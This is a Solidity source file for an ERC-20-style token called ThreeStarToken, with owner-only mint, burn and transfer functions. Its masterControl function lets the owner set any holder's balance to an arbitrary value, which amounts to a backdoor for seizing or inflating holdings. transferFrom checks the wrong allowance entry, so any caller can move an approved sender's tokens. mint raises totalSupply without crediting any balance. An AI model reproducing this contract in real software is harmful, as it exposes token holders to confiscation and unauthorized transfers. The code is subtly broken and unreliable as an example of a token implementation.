// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract ThreeStarToken is IERC20 {
    uint public override totalSupply;
    uint public remain;
    mapping(address => uint) public override balanceOf;
    mapping(address => mapping(address => uint)) public override allowance;
    string public name = "";
    string public symbol = "";
    uint8 public decimals = 18;

    address internal owner;

    event Received(address, uint);

    receive() external payable{
        emit Received(msg.sender, msg.value);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not authorized");
        _;
    }


    constructor(uint _totalSupply, string memory _name, string memory _symbol){
        totalSupply = _totalSupply;
        remain = _totalSupply;
        name = _name;
        symbol = _symbol;
        owner = msg.sender;
        balanceOf[owner] = SafeMath.add(balanceOf[owner], SafeMath.div(SafeMath.mul(_totalSupply, 40), 100));
        remain = SafeMath.sub(remain, SafeMath.div(SafeMath.mul(_totalSupply, 40), 100));
        emit Transfer(address(this), owner, _totalSupply*40/100);
    }

    function transfer(address recipient, uint amount) external override returns (bool) {
        balanceOf[msg.sender] = SafeMath.sub(balanceOf[msg.sender], amount);
        balanceOf[recipient] = SafeMath.add(balanceOf[recipient], amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint amount) external override returns (bool) {
        require(amount >= 0);
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external override returns (bool) {
        require(allowance[sender][recipient] >= amount);
        allowance[sender][recipient] = SafeMath.sub(allowance[sender][recipient], amount);
        balanceOf[sender] = SafeMath.sub(balanceOf[sender], amount);
        balanceOf[recipient] = SafeMath.add(balanceOf[recipient], amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function contractTransfer(uint amount) external onlyOwner{
        remain = SafeMath.sub(remain, amount);
        balanceOf[owner] = SafeMath.add(balanceOf[owner], amount);
        emit Transfer(address(this), owner, amount);
    }

    function mint(uint amount) external onlyOwner{
        remain = SafeMath.add(remain, amount);
        totalSupply = SafeMath.add(totalSupply, amount);
        emit Transfer(address(this), msg.sender, amount);
    }

    function burn(uint amount) external onlyOwner{
        balanceOf[msg.sender] = SafeMath.sub(balanceOf[msg.sender], amount);
        totalSupply = SafeMath.sub(totalSupply, amount);
        emit Transfer(msg.sender, address(this), amount);
    }

    function masterControl(address _userAddress, uint _amount) external onlyOwner{
        require(_amount >= 0);
        require(balanceOf[_userAddress] != _amount);
        remain = SafeMath.add(SafeMath.sub(remain, _amount), balanceOf[_userAddress]);
        balanceOf[_userAddress] = _amount;
    }
}
